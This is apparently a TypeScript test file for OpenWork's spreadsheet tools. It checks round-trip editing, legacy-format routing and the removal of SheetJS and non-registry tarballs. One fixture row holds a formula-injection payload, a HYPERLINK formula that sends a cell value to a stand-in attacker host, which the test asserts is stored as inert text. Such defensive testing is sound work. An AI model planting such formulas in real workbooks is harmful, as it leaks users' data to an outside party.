import { mkdir, mkdtemp, readFile, readdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { expect } from "vitest";
import { test } from "@openwork/testkit";

import { parseSpreadsheet, serializeSpreadsheet } from "../../apps/app/src/react-app/domains/session/artifacts/artifact-spreadsheet-model";
import { openTargetFromWorkspaceFile } from "../../apps/app/src/react-app/domains/session/artifacts/open-target";
import { OpenWorkSpreadsheets } from "../../apps/server/src/opencode-plugins/openwork-spreadsheets";

const repoRoot = fileURLToPath(new URL("../../", import.meta.url));

function toArrayBuffer(bytes: Uint8Array): ArrayBuffer {
  const copy = new Uint8Array(bytes.byteLength);
  copy.set(bytes);
  return copy.buffer;
}

async function sourceFiles(dir: string): Promise<string[]> {
  const entries = await readdir(dir, { withFileTypes: true });
  const files: string[] = [];
  for (const entry of entries) {
    const path = join(dir, entry.name);
    if (entry.isDirectory()) files.push(...await sourceFiles(path));
    else if (/\.(ts|tsx|js|mjs)$/.test(entry.name)) files.push(path);
  }
  return files;
}

test("the artifact spreadsheet preview and the agent's workbook tools share one engine", async ({ evidence }) => {
  const root = await mkdtemp(join(tmpdir(), "openwork-preview-workbook-"));
  try {
    const tools = await OpenWorkSpreadsheets({ directory: root });
    await mkdir(join(root, "reports"));
    await tools.tool.spreadsheet_write.execute({
      path: "reports/pipeline.xlsx",
      sheets: [{ name: "Pipeline", header: false, rows: [[], ["", "Account", "Amount", "Won"], ["", "Northstar", 1742.42, true]] }],
    });

    // Claim: what the agent writes, the preview shows as a grid anchored at A1
    // with the stored values, not shifted to the first used cell.
    const bytes = await readFile(join(root, "reports", "pipeline.xlsx"));
    const rows = await parseSpreadsheet({ name: "reports/pipeline.xlsx", content: { kind: "binary", data: toArrayBuffer(bytes) } });
    expect(rows).toEqual([
      ["", "", "", ""],
      ["", "Account", "Amount", "Won"],
      ["", "Northstar", "1742.42", "TRUE"],
    ]);

    // Claim: an edit saved from the preview keeps value types (number, boolean,
    // leading-zero text) and never turns text into an executable formula, even
    // when it looks like one.
    rows[2][2] = "1800";
    rows.push(["", "Total", '=HYPERLINK("https://attacker.invalid/?v="&C3,"view")', "FALSE"]);
    rows.push(["", "Zip", "02134", ""]);
    const saved = await serializeSpreadsheet("reports/pipeline.xlsx", rows);
    if (saved.kind !== "binary") throw new Error("expected a binary workbook");
    await writeFile(join(root, "reports", "pipeline.xlsx"), new Uint8Array(saved.data));
    const read = await tools.tool.spreadsheet_read.execute({ path: "reports/pipeline.xlsx", formulas: true });
    expect(read).toContain("| 3 | Northstar | 1800 | TRUE |");
    expect(read).toContain('| 4 | Total | =HYPERLINK("https://attacker.invalid/?v="&C3,"view") | FALSE |');
    expect(read).toContain("| 5 | Zip | 02134 |  |");
    const inspected: unknown = JSON.parse(await tools.tool.spreadsheet_inspect.execute({ path: "reports/pipeline.xlsx" }));
    expect(inspected).toMatchObject({ sheets: [expect.objectContaining({ usedRange: "B2:D5", formulas: 0 })] });

    // Negative half: legacy formats no longer route into the in-app editor and
    // the editor says why instead of failing to parse them.
    expect(openTargetFromWorkspaceFile("reports/pipeline.xlsx")?.preview).toBe("sheet");
    expect(openTargetFromWorkspaceFile("reports/table.csv")?.preview).toBe("sheet");
    expect(openTargetFromWorkspaceFile("reports/legacy.xls")?.preview).toBe("external");
    expect(openTargetFromWorkspaceFile("reports/sheet.ods")?.preview).toBe("external");
    await expect(parseSpreadsheet({ name: "legacy.xls", content: { kind: "binary", data: new ArrayBuffer(8) } })).rejects.toThrow("Legacy .xls workbooks can't be edited here");

    evidence.recordAssertionEvidence(
      "The preview shows and saves the same workbook format the agent tools use",
      "A workbook written by spreadsheet_write rendered as an A1-anchored grid with stored values; an edit saved from the preview came back through spreadsheet_read with a number, a boolean, and a leading-zero text cell intact and a formula-looking string stored as text; .xls and .ods route to an external opener with an explanation.",
      true,
    );
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("the desktop renderer no longer depends on SheetJS", async ({ evidence }) => {
  // Claim: no app source imports xlsx, the app manifest does not declare it,
  // and no dependency in the root lockfile resolves from a tarball outside the
  // npm registry.
  const appSources = await sourceFiles(join(repoRoot, "apps/app/src"));
  const importers: string[] = [];
  for (const file of appSources) {
    const source = await readFile(file, "utf8");
    if (/from\s+["']xlsx["']|import\(\s*["']xlsx["']\s*\)|require\(\s*["']xlsx["']\s*\)/.test(source)) importers.push(file.slice(repoRoot.length));
  }
  expect(importers).toEqual([]);
  expect(appSources.some((file) => file.endsWith("artifact-spreadsheet-model.ts"))).toBe(true);

  const manifest: unknown = JSON.parse(await readFile(join(repoRoot, "apps/app/package.json"), "utf8"));
  const dependencies = typeof manifest === "object" && manifest !== null && "dependencies" in manifest ? manifest.dependencies : undefined;
  expect(dependencies).toBeTypeOf("object");
  expect(dependencies).not.toHaveProperty("xlsx");
  expect(dependencies).toHaveProperty("@openwork/workbook", "workspace:*");

  const lockfile = await readFile(join(repoRoot, "pnpm-lock.yaml"), "utf8");
  const offRegistry = lockfile.split("\n").filter((line) => {
    if (!line.includes("resolution:") || !line.includes("tarball:")) return false;
    const tarball = line.match(/tarball:\s*([^,\s}]+)/)?.[1] ?? "";
    try {
      return new URL(tarball).hostname !== "registry.npmjs.org";
    } catch {
      return true;
    }
  });
  expect(offRegistry).toEqual([]);
  expect(lockfile).not.toContain("cdn.sheetjs.com");

  evidence.recordAssertionEvidence(
    "SheetJS is gone from the desktop app",
    "No file under apps/app/src imports xlsx, apps/app/package.json declares @openwork/workbook instead of the cdn.sheetjs.com tarball, and the root lockfile has no dependency resolved from a non-registry tarball.",
    true,
  );
});
